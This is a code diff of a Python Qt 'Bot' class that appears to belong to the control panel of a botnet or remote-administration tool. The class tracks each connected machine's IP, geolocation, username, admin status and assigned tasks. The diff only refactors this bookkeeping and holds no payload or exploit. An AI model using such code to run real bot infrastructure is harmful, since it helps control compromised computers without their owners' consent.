@@ -1,9 +1,8 @@
-from qtpy.QtCore import QObject, Signal, Slot
-
-from models.Events import Info, Module, Task
+from qtpy.QtCore import Signal, Slot
 from QtPyNetwork.models import Device
 
-import logging
+from models.Events import Info, Task
+
 import datetime
 
 
@@ -13,12 +12,9 @@ class Bot(Device):
 
     def __init__(self, bot_id: int, ip: str, port: int, **kwargs):
         super(Bot, self).__init__(bot_id, ip, port)
-        self.logger = logging.getLogger("BOT-{}".format(bot_id))
-
         # add later - uniqe number for each computer
         # ip and port may change - use mac addr?
         self.hash = None
-        self.key = None
 
         self.public_ip = "Unknown"
         self.geolocation = "Unknown"
@@ -28,7 +24,7 @@ class Bot(Device):
         self.username = "Unknown"
         self.administrator = "Unknown"
         self.language = "Unknown"
-        self.creation_time = datetime.datetime.now()
+        self.time_created = datetime.datetime.now()
 
         self.tasks = []
         self.next_task_id = 0
@@ -44,20 +40,17 @@ class Bot(Device):
         return self.next_task_id
 
     @Slot()
-    def serialize(self):
-        return "BOT-{}; IP: {}; PORT: {}; INFO: {} TASKS: {}".format(self.id, self.ip,
-                                                                     self.port, vars(self),
-                                                                     [x.serialize() for x in self.tasks])
-
-    @Slot(bytes)
-    def set_custom_key(self, key: bytes):
-        self.key = key
+    def getTaskById(self, task_id):
+        for task in self.tasks:
+            if task.get_id() == task_id:
+                return task
 
     @Slot(Info)
     def on_info_received(self, info: Info):
         data = {}
         for result in info.results:
             util = info.results.get(result)
+            if result == "tasks":
                 for task in util:
                     ev = Task(info.get_bot_id(), task.get("task_id"), task.get("task"), task.get("state"))
                     self.on_task_received(ev)
@@ -76,6 +69,7 @@ class Bot(Device):
         for bot_task in self.tasks:
             if bot_task.get_id() == task.get_id():
                 bot_task.update(task)
+                self.updated.emit()
                 return
         self.tasks.append(task)
         self.next_task_id = max(t.id for t in self.tasks)
